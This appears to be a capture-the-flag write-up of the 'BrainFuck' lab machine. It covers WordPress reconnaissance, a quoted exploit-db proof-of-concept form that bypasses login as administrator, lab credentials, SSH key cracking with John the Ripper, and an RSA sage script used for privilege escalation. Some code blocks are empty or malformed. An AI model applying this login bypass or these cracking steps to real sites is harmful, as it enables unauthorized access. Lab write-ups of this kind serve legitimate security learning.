With this machine I learned about cryptography how it is used and another way to do privileage  escalation

I started the machine with a scan this has shown multiple ports open 443, 22 to name some of the most intersting ones.

Next I look at the webpages to see if there is any information about the software used or anything that may leed to more intersting information. 

![Search pages](/BrainFuck/OtherPage.png)
![Search pages](/BrainFuck/MainPage.png)
##### [Figure 1.1 - Pages for the website ] 

At first I tried searching the ip of the machine with port 443, this did not work and after a bit of searching online and looking at the nmap scan better I found that with ssl you need to add the names to dns server so in my case i had to add 
Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
These two to my machine. To do this I had to modify 
```bat
    cat /etc/hosts

    127.0.0.1 localhost
    127.0.1.1 kali
    10.10.10.17 www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
```
This made it possible to access the webpages.

Next i ran nikto on the machine to find any sub pages but instead I found some email address
```bat
    nikto -h https://brainfuck.htb
    - Nikto v2.1.6

```
Also after taking a look at the webpages and inspecting the sources i found some wp-content packages which led me to believe the website was made with wordpress. Therefore I had to use the wordpress scanning service that I found online. 
```bat
        wpscan --url https://brainfuck.htb -e u,ap --disable-tls-checks

### Step 2 -Exploitation
---

This lead to finding the version of wordpress and the next logical step was to look in searchsploit to see if I can find any exploits for this version.

```bat
    searchsploit wp support plus
    ------------------------------------------------------------------------------------------ ---------------------------------
    Exploit Title                                                                            |  Path
    ------------------------------------------------------------------------------------------ ---------------------------------
    WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities  | php/webapps/34589.txt
    WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation    | php/webapps/41006.txt
    WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection           | php/webapps/40939.txt
    ------------------------------------------------------------------------------------------ ---------------------------------
    Shellcodes: No Results
    kali@kali:~$ searchsploit -x pphp/webapps/34589.txt
    Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities
        URL: https://www.exploit-db.com/exploits/34589
        Path: /usr/share/exploitdb/exploits/php/webapps/34589.txt
    File Type: ASCII text, with CRLF line terminators



    kali@kali:~$ searchsploit -x php/webapps/41006.txt
    Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
        URL: https://www.exploit-db.com/exploits/41006
        Path: /usr/share/exploitdb/exploits/php/webapps/4



    What I could find after a bit of more digging was the following code for xss injection.

    2. Proof of Concept
    <form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
            Username: <input type="text" name="username" value="administrator">
            <input type="hidden" name="email" value="sth">
            <input type="hidden" name="action" value="loginGuestFacebook">
            <input type="submit" value="Login">
    </form>
```

After putting that in a file and looking better at it I was able to determine that it was a login page 

![Search pages](/BrainFuck/loginPageExploit.png)
##### [Figure 1.2 - Exploit page] 

After looking online for common wordpress usernames I found that admin is the most common one, 
after entering this in the exploit I got to the admin page 
this was the path to the admin page. This took longer than I would like to admit to find out.

    https://brainfuck.htb/wp-admin/portal

![Search pages](/BrainFuck/Wp_adminPage.png)
##### [Figure 1.3 - Admin page with sntp plugin] 

From the admin page we are able to find a plugin  that is used for smtp, looking at it more in detail it has the credentials to login with email.
As such what we do we get the credentials 
```bat
    orestis@brainfuck.htb | KHGuERB29DNiNE
```


This was fairly easy, the only trick was to know how to change the password view from inspector to plaintext by changeing type=password to type=text.

Next I used thunderbird to login to the actual inbox where I found some other credentials that I did not yet know what to do with them.
```bat
    orestis | kIEnnfEKJ#9UmdO
```
After while I decided to work on the other url that I had, then I realized that was a chat and I was able to use the credentials to log in to a specific admin user that had conversations. 

There we find what looks to be an encrypted conversation.

![Search pages](/BrainFuck/EncryptedCoversation.png)
##### [Figure 1.4 - Encrypted conversation] 

At first I thought it was polish but it was not. As such I had to look online for the solution as I got stuck on this. The solution was to use a special decrypting software with KPA
https://www.boxentriq.com/code-breaking/cipher-identifier <- this link was used for decrypting the text.

After proberly decripting the text what comes out is this 
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa <- A link that downloads ssh key but this was not directly available.

Sadly the rsa is encrypted with a password that is not found in the conversation as such I had to use John the ripper.
For this I found a method online with using a specific tool
```bat
     https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
     python ssh2john id_rsa > brainfuck.txt
```
This creates this file 
```bat

```
With this file format we can send it to john the ripper
```bat
    john brainfuck.txt â wordlist=/usr/share/wordlists/rockyou.txt
```
Which outputs the following credentials 

    orestis | 3poulakia!

Which can be used to gain a foothold

---
### Step 3 - Foothold
---
```bat
    ssh -i id_rsa orestis@brainfuck.htb
```
when prompted for the password you can use the one that we just discoverd 

In here we find the user flag.
```bat
    orestis@brainfuck:~$ ls -l
    total 20
    -rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
    -rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
    drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
    -rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
    -r-------- 1 orestis orestis   33 Apr 29  2017 user.txt     
```

### Step 4 - Privilage Escalation
---

For the root password there was a special way to do it that I had to take from the writeup because I had no idea how to implement it myself.

The encrypt.sage file had a way to get root. 
```bat
    nbits = 1024

    password = open("/root/root.txt").read().strip()
    enc_pass = open("output.txt","w")
    debug = open("debug.txt","w")
    m = Integer(int(password.encode('hex'),16))

    p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
    q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
    n = p*q
    phi = (p-1)*(q-1)
    e = ZZ.random_element(phi)
    while gcd(e, phi) != 1:
        e = ZZ.random_element(phi)

    c = pow(m, e, n)
    enc_pass.write('Encrypted Password: '+str(c)+'\n')
    debug.write(str(p)+'\n')
    debug.write(str(q)+'\n')
    debug.write(str(e)+'\n')
```
Apperently sage is a programming library. And from i can understand from this code the file is used to get the actual flag.

After looking around there was a script written just for this 
```bat

We get the root file contents with the flag.
